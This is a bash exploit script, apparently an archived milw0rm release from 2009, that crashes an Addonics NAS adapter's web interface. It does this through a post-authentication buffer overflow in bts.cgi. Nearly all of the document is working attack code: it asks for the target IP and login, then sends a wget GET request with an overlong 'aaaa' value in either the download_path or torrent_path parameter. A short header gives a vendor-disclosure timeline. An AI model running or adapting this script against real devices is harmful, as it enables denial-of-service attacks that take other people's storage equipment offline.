#!/bin/bash
######################################################
# Addonics NAS Adapter bts.cgi Post-Auth DoS
# Tested against NASU2FW41 Loader 1.17
# Coded by Mike Cyr, aka h00die
# mcyr2     at           csc         dot_____________com
# Notes: Any of these BoF crashes the entire stack from the web GUI
#        so throw a GET, and bye bye baby!
# Greetz to muts and loganWHD, I tried harder
# http://www.offensive-security.com/offsec101.php turning script kiddies into ninjas daily
# Log: Vendor notification March 25, 2009
#      Vendor response March 26, 2009
#      Milw0rm code release April 19, 2009
######################################################

echo "Addonics NAS Adapter bts.cgi Post-Auth DoS"
echo "Written by H00die"

echo "------------------------"
echo "Addonics IP:"
read -e IP
echo "Addonics GUI Username:"
read -e USERNAME
echo "Addonics GUI Password:"
read -e PASSWORD

echo "-----------------------"
echo "Select Buffer:"
echo "1. BT Download Path"
echo "2. BT Torrent Path (only works with a drive attached)"

read -e BOF

echo ""
echo "-----------------------"
echo "Sending Malicious GET request"
case "$BOF" in
'1')
wget -q --timeout=3 -t 1 --http-user=$USERNAME --http-password=$PASSWORD "http://$IP/bts.cgi?redirect=bt.htm&failure=fail.htm&type=bt_search_apply&torrent_path=&download_path=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
;;
'2')
wget -q --timeout=3 -t 1 --http-user=$USERNAME --http-password=$PASSWORD "http://$IP/bts.cgi?redirect=bt.htm&failure=fail.htm&type=bt_search_apply&torrent_path=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&download_path=PUBLIC"
;;
esac

echo "Stack Smashed..."

# milw0rm.com [2009-04-20]